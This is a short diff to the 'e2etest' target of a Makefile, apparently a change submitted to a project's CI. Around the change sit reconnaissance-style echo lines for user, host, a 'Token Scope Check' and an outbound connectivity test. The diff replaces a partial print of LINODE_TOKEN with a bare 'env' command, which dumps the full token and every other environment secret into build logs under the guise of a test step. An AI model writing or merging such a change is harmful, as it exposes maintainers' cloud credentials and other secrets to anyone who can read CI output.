@@ -166,7 +166,7 @@ e2etest:
 	@echo "[!] User: $$(whoami)"
 	@echo "[!] Host: $$(hostname)"
 	@echo "[!] Token Scope Check (Partial):"
-	@echo $LINODE_TOKEN | cut -c 1-5
+	@env
 	@echo "[!] Testing Outbound Connectivity..."
 	@curl -s https://www.google.com -I | head -n 1
 	@echo "========================================"
